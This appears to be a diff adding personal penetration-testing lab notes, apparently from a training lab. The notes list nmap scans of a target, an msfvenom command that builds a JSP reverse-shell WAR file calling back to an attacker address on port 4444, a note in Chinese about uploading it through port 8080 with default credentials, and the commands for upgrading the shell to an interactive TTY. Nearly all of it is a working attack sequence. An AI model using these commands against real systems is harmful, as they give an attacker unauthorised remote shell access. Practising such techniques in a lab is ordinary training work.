@@ -1,0 +1,16 @@
+nmap -sV -sC -Pn 10.11.1.209 > nmap.txt
+nmap -p- 10.11.1.209 > nmapall.txt
+nmap -sU 10.11.1.209 > nmapudp.txt
+
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.134 LPORT=4444 -f war > reverse1.war
+
+1.nmap 8080 端口 默認帳密 上傳war包
+
+python -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+ctrl+z
+stty raw -echo && fg
+enter
+stty rows 54 && stty columns 235 && export TERM=xterm
+export TERM=xterm
